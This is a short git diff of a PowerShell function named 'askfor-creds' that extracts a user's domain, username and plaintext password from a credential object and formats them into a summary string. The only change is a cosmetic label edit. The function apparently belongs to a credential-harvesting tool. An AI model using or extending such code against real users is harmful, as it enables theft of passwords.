@@ -308,7 +308,7 @@ function askfor-creds {
 	$domain = [Environment]::UserDomainName
 	$pass = $credentials.getnetworkcredential().password
 
-	$summary = 'Domain: ' + $domain + '\' + $user + ' | ' + 'Pass: ' + $pass 
+	$summary = 'Domain\User: ' + $domain + '\' + $user + ' | ' + 'Pass: ' + $pass 
 	
 	return $summary
 
